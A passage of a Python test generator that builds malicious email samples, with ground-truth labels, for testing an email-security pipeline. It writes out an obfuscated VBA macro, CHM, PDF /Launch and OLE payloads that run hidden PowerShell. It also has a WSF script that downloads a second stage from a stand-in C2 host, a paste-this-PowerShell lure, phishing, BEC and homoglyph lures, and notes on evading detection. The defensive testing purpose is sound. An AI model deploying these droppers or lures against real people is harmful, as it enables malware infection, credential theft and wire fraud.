            b"Attribute VB_Name = \"ThisWorkbook\"\r\n"
            b"Private Sub Workbook_Open()\r\n"
            b"  Dim s As String\r\n"
            b"  s = Chr(112) & Chr(111) & Chr(119) & Chr(101) & Chr(114)\r\n"
            b"  s = s & Chr(115) & Chr(104) & Chr(101) & Chr(108) & Chr(108)\r\n"
            b"  Dim c As String\r\n"
            b"  c = Chr(83) & Chr(104) & Chr(101) & Chr(108) & Chr(108)\r\n"
            b"  Dim x As Object\r\n"
            b"  Set x = CreateObject(\"WScript.\" & c)\r\n"
            b"  x.Run s & \" -nop -w hidden -enc JABjAGwAaQBlAG4AdAA=\"\r\n"
            b"End Sub\r\n"
        )
        vba_bin += obf_macro
        vba_bin += b"\x00" * (4096 - len(vba_bin) % 4096)
        zf.writestr("xl/vbaProject.bin", vba_bin)
    return buf.getvalue()


def _ics_calendar_phishing() -> bytes:
    """ICS calendar invite with phishing URL — social engineering via calendar.

    Evasion: ICS files aren't analyzed by any extraction tool. No YARA rule
    targets calendar format. The phishing link is in a DESCRIPTION field.
    Calendar invites auto-add to Outlook/Gmail — extremely effective vector.
    """
    return (
        b"BEGIN:VCALENDAR\r\n"
        b"VERSION:2.0\r\n"
        b"PRODID:-//ImaniIA Bank//Security//FR\r\n"
        b"METHOD:REQUEST\r\n"
        b"BEGIN:VEVENT\r\n"
        b"DTSTART:20240715T090000Z\r\n"
        b"DTEND:20240715T093000Z\r\n"
        b"SUMMARY:URGENT: Mandatory Security Verification\r\n"
        b"DESCRIPTION:Your account requires immediate verification.\\n"
        b"Click the link below to verify your identity:\\n\\n"
        b"https://imania-verify.evil.test/calendar-auth?emp=target\\n\\n"
        b"Failure to verify within 24 hours will result in account suspension.\\n"
        b"This is an automated security notification.\r\n"
        b"ORGANIZER:mailto:security-noreply@imaniabank.com.tn\r\n"
        b"ATTENDEE;RSVP=TRUE:mailto:target@imaniabank.com.tn\r\n"
        b"LOCATION:https://imania-verify.evil.test/calendar-auth\r\n"
        b"STATUS:CONFIRMED\r\n"
        b"PRIORITY:1\r\n"
        b"END:VEVENT\r\n"
        b"END:VCALENDAR\r\n"
    )


def _spoofed_reply_chain_body() -> str:
    """Email body with fake forwarded/reply chain to build trust.

    Evasion: auth passes (legitimate sending server), no attachments,
    no urgency+targeting combo. The social engineering is in the fake
    conversation history that makes the request seem pre-authorized.
    """
    return (
        "Hi Mohamed,\n\n"
        "As discussed with Aziz, please process the attached wire transfer.\n"
        "The new supplier bank details are below.\n\n"
        "IBAN: DE89 3704 0044 0532 0130 00\n"
        "BIC: COBADEFFXXX\n"
        "Amount: 28,500 EUR\n"
        "Reference: SUP-2024-Q2-FINAL\n\n"
        "Merci,\nSarah\n\n"
        "---------- Forwarded message ----------\n"
        "From: Aziz Benmoussa <aziz.benmoussa@imaniabank.com.tn>\n"
        "Date: Mon, Jul 8, 2024 at 3:42 PM\n"
        "Subject: Re: Supplier Payment - Q2\n"
        "To: Sarah Dumont <s.dumont@supplier-legit.com>\n\n"
        "Sarah,\n\nYes, please send the updated banking details to Mohamed.\n"
        "He will process the payment this week.\n\nCordialement,\nAziz\n\n"
        "---------- Original message ----------\n"
        "From: Sarah Dumont <s.dumont@supplier-legit.com>\n"
        "Date: Mon, Jul 8, 2024 at 2:15 PM\n"
        "Subject: Supplier Payment - Q2\n\n"
        "Bonjour Aziz,\n\nOur banking details have changed for the new quarter.\n"
        "Should I send the new IBAN directly to your finance team?\n\nSarah"
    )


def _zero_width_obfuscated_body() -> str:
    """Email body with zero-width Unicode characters breaking keyword detection.

    Evasion: inserts zero-width spaces (U+200B) and zero-width joiners (U+200D)
    between characters of trigger words. "password" becomes "p\u200bass\u200bword".
    Rules engine string matching won't find "password" or "verify your account".
    """
    zwsp = "\u200b"
    zwj = "\u200d"
    return (
        f"Dear customer,\n\n"
        f"We detected un{zwsp}authorized ac{zwj}cess to your account.\n"
        f"Your ac{zwsp}count will be sus{zwj}pended within 24 hours.\n\n"
        f"Please ver{zwsp}ify your iden{zwj}tity immediately:\n"
        f"https://imania-sec{zwsp}ure.evil.test/ver{zwj}ify\n\n"
        f"Enter your pass{zwsp}word and con{zwj}firm your cre{zwsp}dentials.\n\n"
        f"Fail{zwsp}ure to res{zwj}pond will result in permanent closure.\n\n"
        f"IT Sec{zwsp}urity Team\n"
        f"ImaniIA Bank"
    )


def _homoglyph_domain_body() -> str:
    """Email body using Cyrillic/Greek homoglyphs in domain names.

    Evasion: "imaniabank.com" uses Latin letters but the phishing URL
    uses Cyrillic а (U+0430), е (U+0435), о (U+043E) — visually identical
    but different Unicode codepoints. Domain comparison won't match.
    """
    # Mix Cyrillic lookalikes: а=\u0430, е=\u0435, о=\u043E, с=\u0441
    fake_domain = "\u0430ttij\u0430rib\u0430nk.\u0441\u043Em.tn"
    return (
        "Cher client,\n\n"
        "Votre session bancaire a expire. Pour des raisons de securite,\n"
        "veuillez vous reconnecter immediatement.\n\n"
        f"https://{fake_domain}/secure/login\n\n"
        "Si vous ne vous reconnectez pas dans les 12 heures,\n"
        "votre acces sera temporairement suspendu.\n\n"
        "Service Clientele\n"
        "ImaniIA Bank"
    )


def _chm_help_file() -> bytes:
    """Compiled HTML Help (.chm) file with embedded script.

    Evasion: CHM files contain compressed HTML that runs with local
    privileges via hh.exe. No dedicated CHM parser in the pipeline.
    python-magic identifies as application/x-chm. Contains ActiveX.
    """
    # CHM file magic (ITSF — Info-Tech Storage Format)
    chm = b"ITSF\x03\x00\x00\x00"  # signature + version
    chm += struct.pack("<I", 0x60)  # header length
    chm += b"\x01\x00\x00\x00"  # unknown
    chm += struct.pack("<I", 0x1000)  # timestamp
    chm += struct.pack("<I", 0x0409)  # language (English)
    chm += b"\x00" * (0x60 - len(chm))
    # Embed HTML with ActiveX and PowerShell
    html_payload = (
        b"<html><head><title>Help</title></head><body>"
        b"<h1>Security Policy Guide</h1>"
        b"<object classid='clsid:52a2aaae-085d-4187-97ea-8c30db990436' "
        b"width='1' height='1' id='shortcut'>"
        b"<param name='Command' value='ShortCut'>"
        b"<param name='Item1' value=',cmd.exe,/c powershell -nop -w hidden "
        b"-enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA='>"
        b"</object>"
        b"<script>shortcut.Click();</script>"
        b"</body></html>"
    )
    chm += html_payload
    chm += b"\x00" * (8192 - len(chm))
    return chm


def _ppsx_autoplay() -> bytes:
    """PowerPoint Show (.ppsx) with auto-play OLE action.

    Evasion: PPSX auto-opens in slideshow mode (no edit warning).
    The OLE action triggers on slide transition. oletools may not
    flag it if it only looks for VBA in Workbook_Open patterns.
    """
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
            '<Default Extension="xml" ContentType="application/xml"/>'
            '<Override PartName="/ppt/presentation.xml" '
            'ContentType="application/vnd.openxmlformats-officedocument.presentationml.slideshow.main+xml"/>'
            '</Types>'
        ))
        zf.writestr("_rels/.rels", (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" '
            'Target="ppt/presentation.xml"/>'
            '</Relationships>'
        ))
        # Slide with OLE action on click — runs cmd.exe
        zf.writestr("ppt/presentation.xml", (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main" '
            'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">'
            '<p:sldIdLst><p:sldId id="256" r:id="rId2"/></p:sldIdLst>'
            '</p:presentation>'
        ))
        zf.writestr("ppt/_rels/presentation.xml.rels", (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" '
            'Target="slides/slide1.xml"/>'
            '<Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" '
            'Target="../embeddings/oleObject1.bin"/>'
            '</Relationships>'
        ))
        zf.writestr("ppt/slides/slide1.xml", (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<p:sld xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main" '
            'xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" '
            'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">'
            '<p:cSld><p:spTree><p:nvGrpSpPr><p:cNvPr id="1" name=""/><p:cNvGrpSpPr/><p:nvPr/></p:nvGrpSpPr>'
            '<p:grpSpPr/>'
            '<p:sp><p:nvSpPr><p:cNvPr id="2" name="Action"/><p:cNvSpPr/><p:nvPr>'
            '<p:custDataLst><p:tags r:id="rId3"/></p:custDataLst>'
            '</p:nvPr></p:nvSpPr><p:spPr/>'
            '<p:txBody><a:bodyPr/><a:p><a:r><a:t>Click to view presentation</a:t></a:r></a:p></p:txBody>'
            '</p:sp></p:spTree></p:cSld>'
            '<p:transition><p:sndAc><p:stSnd><p:snd r:embed="rId3"/></p:stSnd></p:sndAc></p:transition>'
            '</p:sld>'
        ))
        # Embedded OLE object with PE payload
        ole_bin = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 50
        ole_bin += b"cmd.exe /c powershell -nop -w hidden -enc JABjAGwAaQBlAG4AdAA="
        ole_bin += b"\x00" * (4096 - len(ole_bin))
        zf.writestr("ppt/embeddings/oleObject1.bin", ole_bin)
    return buf.getvalue()


def _nested_zip_payload() -> bytes:
    """ZIP inside ZIP inside ZIP — each layer has innocent names.

    Evasion: pipeline extracts one level of ZIP. The actual payload
    is buried 3 levels deep. Each layer looks like a normal archive.
    """
    # Inner layer: the actual malicious executable
    pe = _pe_disguised_as_pdf()
    buf3 = io.BytesIO()
    with zipfile.ZipFile(buf3, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("invoice_details.exe", pe)
        zf.writestr("readme.txt", "Open invoice_details to view your invoice.")
    # Middle layer
    buf2 = io.BytesIO()
    with zipfile.ZipFile(buf2, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("documents/invoice.zip", buf3.getvalue())
        zf.writestr("documents/cover_letter.txt", "Please see the attached invoice archive.")
    # Outer layer
    buf1 = io.BytesIO()
    with zipfile.ZipFile(buf1, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("Q2_Deliverables.zip", buf2.getvalue())
        zf.writestr("index.txt", "Q2 deliverables package — see archive inside.")
    return buf1.getvalue()


def _vhd_virtual_disk() -> bytes:
    """VHD virtual disk image with embedded payload.

    Evasion: VHD files auto-mount on Windows 10+, bypassing Mark-of-the-Web.
    No VHD parser in the pipeline. python-magic may not recognize the format.
    Contains a PE payload inside the VHD structure.
    """
    # VHD footer (512 bytes at end of file) — "conectix" magic
    footer = b"conectix"  # creator application
    footer += struct.pack(">I", 0x00000002)  # features
    footer += struct.pack(">I", 0x00010000)  # file format version
    footer += struct.pack(">Q", 0xFFFFFFFFFFFFFFFF)  # data offset (fixed disk)
    footer += struct.pack(">I", int(time.time()))  # timestamp
    footer += b"win " * 1  # creator application
    footer += struct.pack(">I", 0x000A0000)  # creator version
    footer += b"Wi2k"  # creator host OS
    footer += struct.pack(">Q", 10 * 1024 * 1024)  # original size (10MB)
    footer += struct.pack(">Q", 10 * 1024 * 1024)  # current size
    # Disk geometry
    footer += struct.pack(">HBB", 20, 16, 63)  # CHS
    footer += struct.pack(">I", 2)  # disk type: fixed
    footer += b"\x00" * (512 - len(footer))
    # Payload area — PE hidden in "disk content"
    pe = _pe_disguised_as_pdf()
    disk_content = b"\x00" * 512  # boot sector
    disk_content += pe  # embedded PE
    disk_content += b"\x00" * (8192 - len(disk_content))
    return disk_content + footer


def _base64_powershell_txt() -> bytes:
    """Plain text file with base64-encoded PowerShell dropper.

    Evasion: .txt files are "safe" — no extension block, no type mismatch.
    The payload is instructions to paste into PowerShell. Tests whether
    YARA suspicious_powershell rule catches PowerShell keywords in .txt.
    """
    return (
        b"=== IT Support Instructions ===\r\n\r\n"
        b"Dear colleague,\r\n\r\n"
        b"To resolve the VPN connectivity issue, please follow these steps:\r\n\r\n"
        b"1. Press Win+R and type 'powershell' then press Enter\r\n"
        b"2. Copy and paste the following command:\r\n\r\n"
        b"powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden "
        b"-EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0"
        b"ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsA"
        b"IABJAEUAWAAoACQAYwBsAGkAZQBuAHQALgBEAG8AdwBuAGwAbwBhAGQA"
        b"UwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwALgB0AGUAcwB0"
        b"AC8AcwB0AGEAZwBlADIAJwApACkA\r\n\r\n"
        b"3. The VPN fix will be applied automatically.\r\n\r\n"
        b"Note: You may see a brief command window - this is normal.\r\n\r\n"
        b"Regards,\r\n"
        b"IT Support Team\r\n"
        b"Ext: 4521\r\n"
    )


def _wsf_script() -> bytes:
    """Windows Script File (.wsf) — XML-based script container.

    Evasion: .wsf not in BLOCKED_EXTENSIONS (only .vbs and .js are).
    Contains JScript that downloads and executes a payload.
    WSF files run via wscript.exe with full privileges.
    """
    return (
        b'<?xml version="1.0" encoding="UTF-8"?>\r\n'
        b'<job id="update">\r\n'
        b'<script language="JScript">\r\n'
        b'// Security Update Installer v3.2\r\n'
        b'var wsh = new ActiveXObject("WScript.Shell");\r\n'
        b'var xhr = new ActiveXObject("MSXML2.XMLHTTP");\r\n'
        b'xhr.open("GET", "http://mal-c2.evil.test/stage2.ps1", false);\r\n'
        b'xhr.send();\r\n'
        b'var fso = new ActiveXObject("Scripting.FileSystemObject");\r\n'
        b'var tmp = fso.GetSpecialFolder(2) + "\\\\update.ps1";\r\n'
        b'var f = fso.CreateTextFile(tmp, true);\r\n'
        b'f.Write(xhr.responseText);\r\n'
        b'f.Close();\r\n'
        b'wsh.Run("powershell -ep bypass -f " + tmp, 0, false);\r\n'
        b'</script>\r\n'
        b'</job>\r\n'
    )


def _cpl_control_panel() -> bytes:
    """Control Panel file (.cpl) — actually a renamed DLL.

    Evasion: .cpl not in BLOCKED_EXTENSIONS. Executes via control.exe
    or double-click. python-magic sees it as PE/DLL (type mismatch
    with declared MIME won't trigger unless we declare non-PE type).
    """
    return _xll_excel_addin()  # Same PE/DLL structure, different extension


def _pdf_embedded_file_launch() -> bytes:
    """PDF with /EmbeddedFile and /Launch action — no JavaScript.

    Evasion: pdfid checks /JS and /JavaScript, but /Launch with an
    embedded file is a different code path. The PDF "launches" an
    embedded executable when opened. Tests /Launch detection specifically.
    """
    return (
        b"%PDF-1.4\n"
        b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R /Names 4 0 R\n"
        b"   /OpenAction << /S /Launch /Win << /F (cmd.exe) "
        b"/P (/c start /b powershell -nop -enc JABZ) >> >> >>\nendobj\n"
        b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\nendobj\n"
        b"4 0 obj\n<< /Type /Names /EmbeddedFiles\n"
        b"   << /Names [(update.exe) 5 0 R] >> >>\nendobj\n"
        b"5 0 obj\n<< /Type /Filespec /F (update.exe)\n"
        b"   /EF << /F 6 0 R >> >>\nendobj\n"
        b"6 0 obj\n<< /Type /EmbeddedFile /Subtype /application#2Fx-msdownload\n"
        b"   /Length 42 >>\nstream\n"
        b"MZ" + b"\x90" * 40 + b"\n"
        b"endstream\nendobj\n"
        b"xref\n0 7\ntrailer\n<< /Size 7 /Root 1 0 R >>\n"
        b"startxref\n0\n%%EOF\n"
    )


def _email_thread_hijack_body() -> str:
    """Legitimate-looking thread hijack — replies to a real conversation.

    Evasion: passes auth (legitimate server), has proper reply headers,
    body references real internal context. The malicious payload is
    a "shared document" link that looks like internal SharePoint.
    No urgency phrases, no credential requests — pure social engineering.
    """
    return (
        "Bonjour Mohamed,\n\n"
        "Suite a notre reunion de ce matin, voici le document mis a jour\n"
        "avec les modifications demandees par Aziz.\n\n"
        "Lien SharePoint: https://imaniabank-my.sharepoint.evil.test/personal/"
        "docs/Q2_Budget_Final_v3.xlsx\n\n"
        "J'ai aussi ajoute les previsions pour Q3 comme discute.\n"
        "N'hesite pas si tu as des questions.\n\n"
        "Cordialement,\n"
        "Marie - Departement Finance"
    )


def _polyglot_pdf_exe() -> bytes:
    """File that is valid as both PDF and PE executable.

    Evasion: starts with %PDF (passes PDF checks) but also contains
    valid MZ header at an offset. Different from polyglot_PDF_JAR.
    Tests whether the pipeline checks for PE signatures inside PDFs.
    """
    pdf_header = (
        b"%PDF-1.4\n"
        b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        b"2 0 obj\n<< /Type /Pages /Kids [] /Count 0 >>\nendobj\n"
    )
    # Embed PE at offset > 512 bytes
    padding = b" " * (512 - len(pdf_header))
    pe = _pe_disguised_as_pdf()
    trailer = (
        b"\nxref\n0 3\ntrailer\n<< /Size 3 /Root 1 0 R >>\n"
        b"startxref\n0\n%%EOF\n"
    )
    return pdf_header + padding + pe + trailer


def _polyglot_pdf_ole() -> bytes:
    """OLE compound document that also has PDF content.

    Evasion: starts with OLE magic (D0CF11E0) so magic sees it as
    msword, but PDF content is embedded inside. Tests polyglot_file
    YARA rule for OLE + other format detection.
    """
    ole_header = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1"
    ole_header += b"\x00" * (512 - len(ole_header))
    # Embed PDF content in "sector"
    pdf_content = (
        b"%PDF-1.4\n"
        b"1 0 obj\n<< /Type /Catalog >>\nendobj\n"
        b"%%EOF\n"
    )
    # Also embed PE deeper in
    pe_stub = b"MZ" + b"\x90" * 58 + b"This program cannot be run in DOS mode"
    return ole_header + pdf_content + b"\x00" * 200 + pe_stub + b"\x00" * 2048


def _polyglot_pdf_jar() -> bytes:
    """File that is simultaneously valid as both PDF and JAR (ZIP).

    Starts with PDF header but contains a ZIP/JAR structure appended.
    Bypasses filters that only check the beginning of the file.
    """
    # PDF header
    pdf_part = (
        b"%PDF-1.4\n"
        b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        b"2 0 obj\n<< /Type /Pages /Kids [] /Count 0 >>\nendobj\n"
    )
    # JAR (ZIP) appended at the end — ZIP reads from end-of-file
    jar_buf = io.BytesIO()
    with zipfile.ZipFile(jar_buf, "w") as zf:
        zf.writestr("META-INF/MANIFEST.MF", "Main-Class: Exploit\n")
        zf.writestr("Exploit.class",
                     b"\xca\xfe\xba\xbe"  # Java class magic
                     b"\x00\x00\x00\x34"  # Java 8
                     + b"\x00" * 200)
    return pdf_part + jar_buf.getvalue()


# ======================== TEST CASE DEFINITIONS ========================

def build_malicious_cases() -> list[dict]:
    """Generate all malicious test cases with ground truth labels."""
    cases = []

    # --- 1. OLE document with VBA macros ---
    cases.append({
        "name": "OLE_VBA_macro_doc",
        "description": "Word document with AutoOpen VBA macro (PowerShell dropper)",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="accounting@supplier-payments.com",
            to_addr="test@test.com",
            subject="Re: Invoice #INV-2024-0847 - Payment Processing",
            body=(
                "Dear colleague,\n\n"
                "Please find attached the updated invoice for Q2 services.\n"
                "Let me know if you have questions.\n\n"
                "Kind regards,\nSarah Mitchell\nAccounting Department"
            ),
            attachments=[("Invoice_Q2_Final.doc", _ole_vba_document(), "application/msword")],
        ),
    })

    # --- 2. PDF with embedded JavaScript ---
    cases.append({
        "name": "PDF_javascript_launch",
        "description": "PDF with /JavaScript, /OpenAction, and /Launch — C2 callback",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="notifications@secure-banking-portal.com",
            to_addr="test@test.com",
            subject="Your Monthly Statement is Ready",
            body=(
                "Your latest bank statement is now available.\n"
                "Please review the attached document for your records.\n\n"
                "Regards,\nCustomer Service"
            ),
            attachments=[("Statement_June2024.pdf", _pdf_with_js(), "application/pdf")],
        ),
    })

    # --- 3. PE executable disguised as PDF (type mismatch) ---
    cases.append({
        "name": "PE_as_PDF_type_mismatch",
        "description": "MZ executable with .pdf extension — magic bytes vs extension mismatch",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="hr@company-benefits.com",
            to_addr="test@test.com",
            subject="Updated Benefits Package - Action Required",
            body=(
                "Hi,\n\n"
                "The updated benefits package for 2024 is attached.\n"
                "Please review and sign by end of week.\n\n"
                "HR Team"
            ),
            attachments=[("Benefits_2024.pdf", _pe_disguised_as_pdf(), "application/pdf")],
        ),
    })

    # --- 4. Encrypted ZIP with password in body ---
    zip_data, zip_body = _password_zip_with_body_password()
    cases.append({
        "name": "encrypted_zip_password_in_body",
        "description": "Password-protected ZIP + password in email body (CLAUDE.md rule 8)",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="finance@trusted-vendor.com",
            to_addr="test@test.com",
            subject="Protected Invoice - Confidential",
            body=zip_body,
            attachments=[("invoice_protected.zip", zip_data, "application/zip")],
        ),
    })

    # --- 5. OOXML with remote template injection ---
    cases.append({
        "name": "OOXML_remote_template",
        "description": "DOCX with external .dotm template URL (template injection)",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="reports@quarterly-review.com",
            to_addr="test@test.com",
            subject="Q2 Financial Report - Board Review",
            body=(
                "Attached is the Q2 financial report for the board meeting.\n"
                "Please review ahead of Thursday's session.\n\n"
                "Best,\nFinance Team"
            ),
            attachments=[("Q2_Report_2024.docx", _ooxml_remote_template(),
                         "application/vnd.openxmlformats-officedocument.wordprocessingml.document")],
        ),
    })

    # --- 6. HTML smuggling ---
    cases.append({
        "name": "HTML_smuggling",
        "description": "HTML file with base64 PE payload + JavaScript auto-download",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="support@document-cloud-service.com",
            to_addr="test@test.com",
            subject="Shared Document: Project Proposal",
            body=(
                "A document has been shared with you.\n"
                "Open the attached HTML file in your browser to view it.\n\n"
                "Document Cloud Service"
            ),
            attachments=[("view_document.html", _html_smuggling_attachment(), "text/html")],
        ),
    })

    # --- 7. SVG with XSS script ---
    cases.append({
        "name": "SVG_embedded_script",
        "description": "SVG image with JavaScript cookie exfiltration",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="analytics@dashboard-reports.com",
            to_addr="test@test.com",
            subject="Weekly Performance Chart",
            body=(
                "Hi team,\n\n"
                "Attached is this week's performance chart.\n\n"
                "Analytics Team"
            ),
            attachments=[("performance_chart.svg", _svg_with_script(), "image/svg+xml")],
        ),
    })

    # --- 8. ISO image with LNK payload ---
    cases.append({
        "name": "ISO_with_LNK_payload",
        "description": "ISO container with embedded LNK shortcut running PowerShell",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="it-support@internal-tools.com",
            to_addr="test@test.com",
            subject="Software Update Package",
            body=(
                "Please install the latest security update from the attached package.\n\n"
                "IT Support"
            ),
            attachments=[("SecurityUpdate_2024.iso", _iso_image_with_lnk(),
                         "application/x-iso9660-image")],
        ),
    })

    # --- 9. Polyglot PDF/JAR ---
    cases.append({
        "name": "polyglot_PDF_JAR",
        "description": "File valid as both PDF and Java JAR — bypasses extension-based filters",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="research@academic-journal.org",
            to_addr="test@test.com",
            subject="Peer Review: Submission #4821",
            body=(
                "Dear reviewer,\n\n"
                "Please find the manuscript attached for your review.\n"
                "The review deadline is July 15.\n\n"
                "Editorial Office"
            ),
            attachments=[("manuscript_4821.pdf", _polyglot_pdf_jar(), "application/pdf")],
        ),
    })

    # --- 10. Spear phishing with DMARC failure + urgency + credential harvesting ---
    cases.append({
        "name": "spear_phish_credential_harvest",
        "description": "Fake IT alert with auth failure + credential harvesting link",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="it-security@imaniabenk.com.tn",  # typosquat
            to_addr="test@test.com",
            subject="URGENT: Your Account Will Be Suspended",
            body=(
                "Dear user,\n\n"
                "We detected unauthorized access to your account. "
                "Your account will be suspended within 24 hours unless you "
                "verify your identity immediately.\n\n"
                "Click here to confirm your password: "
                "http://imania-secure-verify.com/login\n\n"
                "Failure to respond will result in permanent account closure.\n\n"
                "IT Security Team\nImaniIA Bank"
            ),
            auth_pass=False,
        ),
    })

    # --- 11. BEC / CEO fraud ---
    cases.append({
        "name": "CEO_wire_fraud",
        "description": "CEO impersonation requesting urgent wire transfer with IBAN",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="ceo.bureau@imaniabank-tn.com",  # look-alike domain
            to_addr="test@test.com",
            subject="Confidential - Urgent Wire Transfer",
            body=(
                "Bonjour,\n\n"
                "J'ai besoin que vous effectuiez un virement urgent "
                "pour nos operations habituelles.\n\n"
                "Montant: 45,000 EUR\n"
                "IBAN: DE89 3704 0044 0532 0130 00\n"
                "BIC: COBADEFFXXX\n\n"
                "C'est confidentiel, ne parlez a personne. "
                "Confirmez quand c'est fait.\n\n"
                "Cordialement"
            ),
            auth_pass=False,
        ),
    })

    # --- 12. Double-extension executable ---
    cases.append({
        "name": "double_extension_screensaver",
        "description": "Executable with .pdf.scr double extension",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="documents@file-share-service.com",
            to_addr="test@test.com",
            subject="Shared File: Annual Report",
            body="The requested file has been shared with you.\n\nFile Share Service",
            attachments=[("Annual_Report.pdf.scr", _double_extension_exe(),
                         "application/octet-stream")],
        ),
    })

    # ===================================================================
    # RED TEAM ATTACK VECTORS (v2) — 21 additional evasion techniques
    # ===================================================================

    # --- 13. QR code phishing — malicious URL hidden in image, not body ---
    cases.append({
        "name": "qr_code_phishing",
        "description": "PNG with phishing URL in metadata — no link in email body",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="noreply@secure-verification.com",
            to_addr="test@test.com",
            subject="Scan to Verify Your Account",
            body=(
                "Dear customer,\n\n"
                "For enhanced security, please scan the attached QR code\n"
                "with your mobile device to complete identity verification.\n\n"
                "This is a mandatory annual security check.\n\n"
                "Security Team"
            ),
            attachments=[("verification_qr.png", _qr_code_phishing_png(), "image/png")],
        ),
    })

    # --- 14. DDE exploit in .docx — no VBA macros ---
    cases.append({
        "name": "DDE_exploit_docx",
        "description": "DOCX with DDE field executing PowerShell — no macro warning",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="payroll@company-hr-portal.com",
            to_addr="test@test.com",
            subject="Updated Salary Schedule - November 2024",
            body=(
                "Hi team,\n\n"
                "The updated salary schedule is attached.\n"
                "Please review your department's allocations.\n\n"
                "Regards,\nHR Department"
            ),
            attachments=[("Salary_Schedule_Nov2024.docx", _dde_docx(),
                         "application/vnd.openxmlformats-officedocument.wordprocessingml.document")],
        ),
    })

    # --- 15. RTF with embedded OLE object ---
    cases.append({
        "name": "RTF_embedded_OLE",
        "description": "RTF document with OLE object containing PE payload (CVE-2017-11882 style)",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="procurement@vendor-invoices.com",
            to_addr="test@test.com",
            subject="Purchase Order #PO-2024-5839",
            body=(
                "Dear procurement team,\n\n"
                "Attached is the purchase order for the Q3 equipment.\n"
                "Please confirm receipt.\n\n"
                "Vendor Relations"
            ),
            attachments=[("PO_2024_5839.doc", _rtf_ole_object(), "application/msword")],
        ),
    })

    # --- 16. OneNote with embedded executable ---
    cases.append({
        "name": "OneNote_embedded_payload",
        "description": "OneNote .one file with embedded HTA payload — no dedicated parser",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="training@corporate-learning.com",
            to_addr="test@test.com",
            subject="New Training Module: Cybersecurity Awareness",
            body=(
                "Hi,\n\n"
                "Please open the attached OneNote notebook for the\n"
                "mandatory cybersecurity awareness training module.\n\n"
                "Corporate Training"
            ),
            attachments=[("CyberSecurity_Training.one", _onenote_embedded_payload(),
                         "application/onenote")],
        ),
    })

    # --- 17. ZIP bomb — extraction timeout attack ---
    cases.append({
        "name": "zip_bomb_timeout",
        "description": "Nested ZIP bomb to trigger extraction timeout — fail-safe test",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="archive@data-delivery.com",
            to_addr="test@test.com",
            subject="Data Export - Your Requested Files",
            body=(
                "Your requested data export is ready.\n"
                "See attached archive.\n\n"
                "Data Services"
            ),
            attachments=[("data_export_2024.zip", _zip_bomb(), "application/zip")],
        ),
    })

    # --- 18. Steganography PNG — payload in pixel LSBs ---
    cases.append({
        "name": "steganography_payload",
        "description": "PNG with PowerShell payload hidden in pixel LSBs + suspicious metadata",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="marketing@brand-assets.com",
            to_addr="test@test.com",
            subject="Updated Brand Logo for Q3 Campaign",
            body=(
                "Hi,\n\n"
                "Here's the updated logo for the Q3 marketing campaign.\n"
                "Please use this version going forward.\n\n"
                "Brand Team"
            ),
            attachments=[("brand_logo_q3.png", _steganography_png(), "image/png")],
        ),
    })

    # --- 19. Standalone .lnk shortcut — not inside ISO ---
    cases.append({
        "name": "standalone_LNK_shortcut",
        "description": "Bare .lnk file executing PowerShell — evades ISO-dependent YARA rule",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="it-helpdesk@internal-support.com",
            to_addr="test@test.com",
            subject="VPN Fix - Run This Shortcut",
            body=(
                "Hi,\n\n"
                "We've identified the VPN issue on your machine.\n"
